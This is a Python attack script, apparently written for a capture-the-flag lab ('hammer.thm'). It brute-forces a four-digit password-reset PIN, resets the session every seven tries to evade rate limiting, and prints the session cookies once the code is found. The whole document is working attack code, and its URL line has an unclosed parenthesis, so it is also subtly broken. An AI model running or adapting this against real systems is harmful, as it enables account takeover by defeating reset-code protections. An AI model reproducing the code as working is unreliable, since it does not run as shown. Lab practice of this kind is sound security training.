import requests
import random

resetpasswordurl = ("http://xx.xx.xxx.xxx:1337/reset_password.php" #Change IP
pin_list = list(range(10000))
random.shuffle(pin_list)

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "DNT": "1",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-GPC": "1",
    "Priority": "u=0, i",
}

def reset_password(session):
    data = {
        "email": "tester@hammer.thm"
    }
    response = session.post(resetpasswordurl, headers=headers, data=data)
    print(f"[+] Reset request status: {response.status_code}")
    return session  

def send_pin(session):
    for attempt, pin in enumerate(pin_list, start=1):
        if attempt % 7 == 0:
            print("[*] Refreshing session and resetting password.")
            session = requests.Session()
            reset_password(session)

        pin_str = str(pin).zfill(4)
        data = {
            "recovery_code": pin_str
        }

        response = session.post(resetpasswordurl, headers=headers, data=data)
        print(f"[*] Trying PIN {pin_str} - Response size: {len(response.text)}")

        if len(response.text) != 2188:
            print(f"[+] Correct PIN: {pin_str}")
            print(f"[+] Response Cookies: {session.cookies.get_dict()}")
            break

if __name__ == "__main__":
    session = requests.Session()
    reset_password(session)
    send_pin(session)
